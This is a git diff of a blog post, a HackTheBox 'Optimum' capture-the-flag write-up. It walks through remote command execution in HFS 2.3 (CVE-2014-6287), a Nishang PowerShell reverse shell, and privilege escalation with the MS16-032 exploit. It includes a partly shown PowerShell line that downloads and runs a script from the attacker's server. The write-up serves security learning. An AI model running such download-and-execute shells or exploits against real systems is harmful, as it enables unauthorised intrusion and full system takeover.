@@ -1,10 +1,21 @@
 ---
+weight: 1
 title: "HackTheBox - Optimum Writeup"
 date: 2022-06-17
 draft: false
-tags: ["CVE-2014-6287", "CVE-2016-0099", "rce", "reverse-powershell", "httpfileserver", "empire-project", "windows-sysnative"]
-htb: "HacktheBox"
-windows: "Windows"
+author: "SH∆FIQ ∆IM∆N"
+authorLink: "https://shafiqaiman.com"
+images: []
+resources:
+- name: "featured-image"
+  src: "featured.png"
+
+tags: ["CVE-2014-6287", "CVE-2016-0099", "MS16-032", "rce", "reverse-powershell", "httpfileserver", "HFS", "empire-project", "windows-sysnative", "powershell-arc"]
+categories: ["HacktheBox"]
+
+lightgallery: true
+toc:
+  auto: false
 ---
 
 ## Nmap
@@ -33,43 +44,44 @@ Service detection performed. Please report any incorrect results at https://nmap
 Interesting, the only port open is `80` and the banner says `HttpFileServer/HFS 2.3`
 
 ## HFS (HttpFileServer)
-
-> HTTP File Server, otherwise known as HFS, is a free web server specifically designed for publishing and sharing files.
-> It's different from classic file sharing because it uses web technology to be more compatible with today's Internet.
-> _resource: [wikipedia](https://en.wikipedia.org/wiki/HTTP_File_Server)_
+{{< admonition tip "Description" >}}
+**HTTP File Server**, otherwise known as `HFS`, is a free web server specifically designed for publishing and sharing files. </br>
+It's different from classic file sharing because it uses web technology to be more compatible with today's Internet. _resource: [wikipedia](https://en.wikipedia.org/wiki/HTTP_File_Server)_
+{{< /admonition >}}
 
 I navigate to the `port 80` through the web browser. WOW! it's just a simple webpage and its also can search files,? I believed. Well, this box is really old by the time I'm writing this. Like always I'm asking google about this information and waiting for the result to come in.
 
-![1](hfs-main-page.png)
+![HFS webpage](hfs-main-page.png "HFS webpage")
 
 ### CVE-2014-6287
 Upon searching on the internet. I found this `HFS` version is vulnerable to `RCE (remote command execution)` and got assigned to a [CVE-2014-6287](https://nvd.nist.gov/vuln/detail/CVE-2014-6287). I also found this [article](https://www.kb.cert.org/vuls/id/251276) with a payload sample.
 
-> CVE description:
-> The findMacroMarker function in parserLib.pas in Rejetto HTTP File Server (aks HFS or HttpFileServer) 2.3x before 2.3c allows remote attackers to execute arbitrary programs via a %00 sequence in a search action.
+{{< admonition tip "CVE description" >}}
+The `findMacroMarker` function in `parserLib.pas` in Rejetto HTTP File Server (aks HFS or HttpFileServer) 2.3x before 2.3c allows remote attackers to execute arbitrary programs via a `%00` sequence in a search action.
+{{< /admonition >}}
 
 ### Burpsuite
 I already have the [payload sample](https://www.kb.cert.org/vuls/id/251276) and I'm gonna try it out with simple command. The command is `whoami`. First, I intercept the `search` endpoint with [burpsuite](https://portswigger.net/burp). Then, send the request through the repeater and put the payload in the search query. However, it didn't display any output from my `whoami` command. Then, I remembered about the `ping` command. So, I try to ping myself to see, if I get the connection through the box.
 
-![1](burpsuite-search-ping.png)
+![ping myself](burpsuite-search-ping.png "ping myself")
 
-![1](tcpdump-ping-tun0.png)
+![receiving the ping request](tcpdump-ping-tun0.png "receiving the ping request")
 
 ## Nishang: Invoke-PowerShellTcp.ps1
 
-The command runs successfully, with this information, I'm gonna try to gain a foothold on the box with [nishang](https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1) reverse shell script. Check this [blog](https://shafiqaiman.com/hackthebox-responder-writeup/#nishang-invoke-powershelltcpps1)  where I configure the reverse shell script.
+The command runs successfully, with this information, I'm gonna try to gain a foothold on the box with [nishang](https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1) reverse shell script. Check this [blog](https://shafiqaiman.com/posts/htb/responder/#nishang-invoke-powershelltcpps1)  where I configure the reverse shell script.
 
-First, I created a new directory called `www` and put the reverse shell script in the same directory. Then, I'm hosting the [python](https://www.python.org/downloads/) web server in port `80` and run the `nc` listener with `rlwrap` since this is a `Windows` machine. Back to the burpsuite, I use this [payload](https://shafiqaiman.com/hackthebox-responder-writeup/#nishang-invoke-powershelltcpps1), which is downloading the reverse shell script and executing it. `Don't forget the (dot) at the end`. 
+First, I created a new directory called `www` and put the reverse shell script in the same directory. Then, I'm hosting the [python](https://www.python.org/downloads/) web server in port `80` and run the `nc` listener with `rlwrap` since this is a `Windows` machine. Back to the burpsuite, I use this [payload](https://shafiqaiman.com/posts/htb/responder/#nishang-invoke-powershelltcpps1), which is downloading the reverse shell script and executing it. `Don't forget the (dot) at the end`. 
 
-![1](python3-server-and-nc-listening.png)
+![serve python server](python3-server-and-nc-listening.png "serve python server")
 
-![1](burpsuite-with-powershell-reverse-shell.png)
+![execute reverse shell](burpsuite-with-powershell-reverse-shell.png "execute reverse shell")
 
-![1](nc-catch-the-shell.png)
+![shell as kostas](nc-catch-the-shell.png "shell as kostas")
 
 NICE!. Finally, I'm in as a `kostas` user. Since this is an old machine from [HacktheBox](https://app.hackthebox.com/), I'm gonna assume they are plenty of exploits on the internet waiting to be found. Well, I'm going to check this machine system with the `systeminfo` command first.
 
-![1](run-the-systeminfo-command.png)
+![systeminfo](run-the-systeminfo-command.png "systeminfo")
 
 ### MS16-032 : CVE-2016-0099
 
@@ -79,26 +91,29 @@ This is a `Windows Server 2012R2` version `6.3.9600 N/A Build 9600` and the arch
 
 I manage to find this [exploit](https://www.exploit-db.com/exploits/39719) in the [exploit-db](https://www.exploit-db.com/). However, the exploit itself didn't work in my case because it's open the `cmd` through `GUI` and I don't have access to the `GUI` instance. Luckily, I found the [powershell exploit](https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/privesc/Invoke-MS16032.ps1) that allows me to privesc from the [EmpireProject](https://github.com/EmpireProject/Empire).
 
-> Empire is a post-exploitation framework that includes a pure-PowerShell2.0 Windows agent, and a pure Python 2.6/2.7 Linux/OS X agent. It is the merge of the previous PowerShell Empire and Python EmPyre projects. <br>
-> _resource: [EmpireProject github](https://github.com/EmpireProject/Empire)_
+{{< admonition tip "EmpireProject" >}}
+Is a post-exploitation framework that includes a pure-PowerShell2.0 Windows agent, and a pure Python 2.6/2.7 Linux/OS X agent. </br>
+It is the merge of the previous PowerShell Empire and Python EmPyre projects. </br>
+_resource: [EmpireProject github](https://github.com/EmpireProject/Empire)_
+{{< /admonition >}}
 
 So, I'm gonna download it with the `wget` command. Then, edit the file by putting the **example** in the last line also edit the `URL` to point into my python server with another reverse shell called `yeet.ps1`
 
 _Note: the example start with **Invoke-MS16-032**. However, the function is named **Invoke-MS16032**_
 
-![1](download-ms16032-wget.png)
+![download the exploit](download-ms16032-wget.png "download the exploit")
 
-![1](edit-the-exploit-file-ms16032.png)
+![exploit example](edit-the-exploit-file-ms16032.png "exploit example")
 
-![1](put-at-the-last-line.png)
+![edit the exploit](put-at-the-last-line.png "edit the exploit")
 
 ### Windows: sysnative
 
 I tried a bunch of times to run this exploit but the result is nothing. This machine is `64` bit and also the exploit is tested on a `64` bit `2k12R2` server. Now, I'm dumbfounded. Then, I realize maybe the powershell itself running on another architecture. So, I [check](https://stackoverflow.com/questions/8588960/determine-if-current-powershell-process-is-32-bit-or-64-bit/8589649#8589649), and it's confirmed. The powershell is running on `32` bit.
 
-![1](example-tested-exploit.png)
+![exploit compatibility](example-tested-exploit.png "exploit compatibility")
 
-![1](check-the-arc-of-powershell-32-bit.png)
+![check powershell architecture](check-the-arc-of-powershell-32-bit.png "check powershell architecture")
 
 With quick googling, I found this [answer](https://stackoverflow.com/questions/19055924/how-to-launch-64-bit-powershell-from-32-bit-cmd-exe/19056011#19056011) on [stackoverflow](https://stackoverflow.com/). I need to run the powershell in the `sysnative` directory to get the `64` bit version. Well, I need to restart over again. So, back again to the burpsuite and put this as the payload. Then, catch the shell with `nc`.
 
@@ -108,10 +123,10 @@ C:\Windows\sysnative\WindowsPowerShell\v1.0\powershell.exe "IEX(New-Object Net.W
 
 When I checked the powershell architecture indeed it is running on 	`64` bit. YES!!!
 
-![1](check-the-arc-of-powershell-64-bit.png)
+![using 64bit powershell](check-the-arc-of-powershell-64-bit.png "using 64bit powershell")
 
 ## Windows: Privilege Escalation
 
 Now, I'm executing the [privesc exploit](https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/privesc/Invoke-MS16032.ps1) once again. My python server shows the request from the file called `Invoke-MS16032.ps1` followed with `yeet.ps1` and finally, I've got a shell as `system`.
 
-![1](last-image.png)
+![shell as nt authority\system](last-image.png "shell as nt authority\system")
